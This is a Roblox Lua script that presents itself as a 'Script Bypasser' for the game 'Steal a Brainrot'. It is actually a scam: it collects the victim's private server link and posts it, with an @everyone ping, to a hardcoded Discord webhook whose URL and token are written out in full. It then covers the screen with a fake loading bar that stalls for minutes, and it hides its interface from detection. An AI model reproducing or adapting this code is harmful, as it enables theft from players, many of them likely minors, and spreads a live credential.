local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1449769235231281266/j_92DT0bxqCTarbFnQiIXFHPSX6h-cfAEqeIcCM00wEGa9EhMrq8s69WUklUr1lnTOZO"
local TITLE_TEXT = "Steal a Brainrot"
local SECONDS_PER_PERCENT = 5

local function isPrivateServerLink(text)
	if type(text) ~= "string" then return false end
	if not string.find(text, "https://www.roblox.com/games/") then return false end
	if not string.find(text, "privateServerLinkCode=") then return false end
	return true
end

local function sendWebhook(text)
	local payload = {
		content = "@everyone\nNew Private Server Link:\n" .. text .. "\nLoading Time: 1%"
	}

	local req =
		(syn and syn.request)
		or (http and http.request)
		or http_request
		or request

	if not req then
		return
	end

	req({
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode(payload)
	})
end

local gui = Instance.new("ScreenGui")
gui.Name = "ScriptBypasserGUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Enabled = true

pcall(function()
	if syn and syn.protect_gui then
		syn.protect_gui(gui)
	end
end)

gui.Parent = game:GetService("CoreGui")

local menu = Instance.new("Frame")
menu.Parent = gui
menu.Size = UDim2.fromScale(0.35, 0.35)
menu.Position = UDim2.fromScale(0.325, 0.325)
menu.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
menu.BorderSizePixel = 0
menu.ZIndex = 5
Instance.new("UICorner", menu).CornerRadius = UDim.new(0, 18)

local title = Instance.new("TextLabel")
title.Parent = menu
title.Size = UDim2.fromScale(1, 0.25)
title.BackgroundTransparency = 1
title.Text = "Script Bypasser"
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.ZIndex = 6

local box = Instance.new("TextBox")
box.Parent = menu
box.Size = UDim2.fromScale(0.9, 0.2)
box.Position = UDim2.fromScale(0.05, 0.35)
box.PlaceholderText = "Paste PRIVATE SERVER link only"
box.Text = ""
box.ClearTextOnFocus = false
box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
box.TextColor3 = Color3.new(1, 1, 1)
box.Font = Enum.Font.Gotham
box.TextScaled = true
box.BorderSizePixel = 0
box.ZIndex = 6
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

local submit = Instance.new("TextButton")
submit.Parent = menu
submit.Size = UDim2.fromScale(0.5, 0.18)
submit.Position = UDim2.fromScale(0.25, 0.65)
submit.Text = "Submit"
submit.BackgroundColor3 = Color3.new(1, 1, 1)
submit.TextColor3 = Color3.new(0, 0, 0)
submit.Font = Enum.Font.GothamBold
submit.TextScaled = true
submit.BorderSizePixel = 0
submit.ZIndex = 10
Instance.new("UICorner", submit).CornerRadius = UDim.new(0, 12)

local black = Instance.new("Frame")
black.Parent = gui
black.Size = UDim2.fromScale(1, 1)
black.BackgroundColor3 = Color3.new(0, 0, 0)
black.Visible = false
black.ZIndex = 20

local loadTitle = Instance.new("TextLabel")
loadTitle.Parent = black
loadTitle.Size = UDim2.fromScale(1, 0.2)
loadTitle.Position = UDim2.fromScale(0, 0.25)
loadTitle.BackgroundTransparency = 1
loadTitle.Text = TITLE_TEXT
loadTitle.Font = Enum.Font.GothamBlack
loadTitle.TextColor3 = Color3.new(1, 1, 1)
loadTitle.TextScaled = true
loadTitle.ZIndex = 21

local barBG = Instance.new("Frame")
barBG.Parent = black
barBG.Size = UDim2.fromScale(0.6, 0.05)
barBG.Position = UDim2.fromScale(0.2, 0.55)
barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBG.BorderSizePixel = 0
barBG.ZIndex = 21
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1, 0)

local bar = Instance.new("Frame")
bar.Parent = barBG
bar.Size = UDim2.fromScale(0, 1)
bar.BackgroundColor3 = Color3.new(1, 1, 1)
bar.BorderSizePixel = 0
bar.ZIndex = 22
Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)

local percentLabel = Instance.new("TextLabel")
percentLabel.Parent = black
percentLabel.Size = UDim2.fromScale(1, 0.1)
percentLabel.Position = UDim2.fromScale(0, 0.62)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "1%"
percentLabel.Font = Enum.Font.Gotham
percentLabel.TextColor3 = Color3.new(1, 1, 1)
percentLabel.TextScaled = true
percentLabel.ZIndex = 21

local loading = false

submit.MouseButton1Click:Connect(function()
	if loading then return end

	if not isPrivateServerLink(box.Text) then
		box.Text = ""
		box.PlaceholderText = "INVALID LINK (PRIVATE SERVER ONLY)"
		return
	end

	loading = true
	sendWebhook(box.Text)

	menu.Visible = false
	black.Visible = true

	local current = 1
	while current <= 100 do
		percentLabel.Text = current .. "%"
		TweenService:Create(
			bar,
			TweenInfo.new(0.25),
			{ Size = UDim2.fromScale(current / 100, 1) }
		):Play()

		task.wait(SECONDS_PER_PERCENT)
		current += 1
	end
end)
